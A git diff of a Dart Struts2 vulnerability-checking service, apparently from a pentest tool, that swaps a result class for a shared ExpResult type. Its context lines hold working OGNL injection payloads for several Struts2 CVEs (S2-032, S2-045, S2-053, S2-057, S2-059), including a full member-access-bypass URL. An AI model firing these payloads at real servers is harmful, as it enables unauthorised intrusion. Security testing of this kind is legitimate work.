@@ -2,6 +2,8 @@ import 'dart:convert';
 
 import 'package:http/http.dart' as http;
 
+import 'services/exp_result.dart';
+
 enum Struts2VulnType {
   s2032('S2-032 (CVE-2016-3081)', 'DMI 方法 OGNL 注入'),
   s2045('S2-045 (CVE-2017-5638)', 'Content-Type OGNL 注入'),
@@ -14,12 +16,6 @@ enum Struts2VulnType {
   final String desc;
 }
 
-class Struts2Result {
-  final bool vulnerable;
-  final String vulnName;
-  final String detail;
-  Struts2Result(this.vulnerable, this.vulnName, this.detail);
-}
 
 class Struts2ExpService {
   final Uri baseUri;
@@ -34,7 +30,7 @@ class Struts2ExpService {
   // 服务器写完 marker 后会直接关闭连接（chunked transfer 未正常结束），
   // http.post() 会因此抛异常。改用 StreamedResponse 逐块读取，
   // 连接中断后仍检查已收到的内容。
-  Future<Struts2Result> checkS2045() async {
+  Future<ExpResult> checkS2045() async {
     const marker = '54289';
     final ognl =
         '%{(#nike=\'multipart/form-data\').'
@@ -63,7 +59,7 @@ class Struts2ExpService {
         // 服务器提前关闭连接属正常现象，检查已收到的内容
       }
       if (buf.toString().contains(marker)) {
-        return Struts2Result(
+        return ExpResult(
           true,
           'S2-045 (CVE-2017-5638)',
           'Content-Type OGNL 注入，响应体含标记值 $marker',
@@ -73,30 +69,30 @@ class Struts2ExpService {
     } finally {
       client.close();
     }
-    return Struts2Result(false, 'S2-045 (CVE-2017-5638)', '');
+    return ExpResult(false, 'S2-045 (CVE-2017-5638)', '');
   }
 
   // S2-032: method: 参数 OGNL
-  Future<Struts2Result> checkS2032() async {
+  Future<ExpResult> checkS2032() async {
     try {
       final detectUrl =
           '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3d"54289",%23w.print(%23s),%23w.close(),1?%23xx:%23request.toString&encoding=UTF-8';
       final res = await http.get(Uri.parse(detectUrl)).timeout(timeout);
       if (res.body.contains('54289')) {
-        return Struts2Result(
+        return ExpResult(
           true,
           'S2-032 (CVE-2016-3081)',
           'DMI 方法 OGNL 注入，验证通过',
         );
       }
     } catch (_) {}
-    return Struts2Result(false, 'S2-032 (CVE-2016-3081)', '');
+    return ExpResult(false, 'S2-032 (CVE-2016-3081)', '');
   }
 
   // S2-053: Freemarker 二次 OGNL 注入
   // 机制：Freemarker 渲染 ${name} 变量，name 值中的 %{OGNL} 被 Struts2 二次求值
   // 路径：/hello.action（vulhub 环境），payload 末尾必须带换行否则无法触发
-  Future<Struts2Result> checkS2053({String path = 'hello.action'}) async {
+  Future<ExpResult> checkS2053({String path = 'hello.action'}) async {
     try {
       final uri = baseUri.resolve(path);
       // payload 末尾必须有换行（vulhub README 特别注明）
@@ -109,14 +105,14 @@ class Struts2ExpService {
           )
           .timeout(timeout);
       if (res.body.contains('54289')) {
-        return Struts2Result(
+        return ExpResult(
           true,
           'S2-053',
           'Freemarker 二次 OGNL 注入，数学运算验证通过 (233*233=54289)',
         );
       }
     } catch (_) {}
-    return Struts2Result(false, 'S2-053', '');
+    return ExpResult(false, 'S2-053', '');
   }
 
   // 执行命令 - S2-053
@@ -165,7 +161,7 @@ class Struts2ExpService {
 
   // S2-057: namespace OGNL (需要路径)
   // 漏洞触发时 OGNL 表达式求值结果出现在 Location 响应头，而非响应体
-  Future<Struts2Result> checkS2057({String path = 'struts2-showcase'}) async {
+  Future<ExpResult> checkS2057({String path = 'struts2-showcase'}) async {
     try {
       final detectUrl =
           'http://${baseUri.host}:${baseUri.port}/$path/%24%7b233*233%7d/actionChain1.action';
@@ -176,7 +172,7 @@ class Struts2ExpService {
         final streamed = await client.send(request).timeout(timeout);
         final location = streamed.headers['location'] ?? '';
         if (location.contains('54289')) {
-          return Struts2Result(
+          return ExpResult(
             true,
             'S2-057 (CVE-2018-11776)',
             'Namespace OGNL 注入，数学运算验证通过 (Location: $location)',
@@ -186,11 +182,11 @@ class Struts2ExpService {
         client.close();
       }
     } catch (_) {}
-    return Struts2Result(false, 'S2-057 (CVE-2018-11776)', '');
+    return ExpResult(false, 'S2-057 (CVE-2018-11776)', '');
   }
 
   // S2-059: id 字段二次 OGNL 求值
-  Future<Struts2Result> checkS2059() async {
+  Future<ExpResult> checkS2059() async {
     try {
       final payload = 'id=%25%7b233*233%7d';
       final res = await http
@@ -201,17 +197,17 @@ class Struts2ExpService {
           )
           .timeout(timeout);
       if (res.body.contains('54289')) {
-        return Struts2Result(
+        return ExpResult(
           true,
           'S2-059 (CVE-2019-0230)',
           '标签属性二次 OGNL 求值，数学运算验证通过',
         );
       }
     } catch (_) {}
-    return Struts2Result(false, 'S2-059 (CVE-2019-0230)', '');
+    return ExpResult(false, 'S2-059 (CVE-2019-0230)', '');
   }
 
-  Future<Struts2Result> checkSingle(
+  Future<ExpResult> checkSingle(
     Struts2VulnType type, {
     String path = 'struts2-showcase',
   }) async {
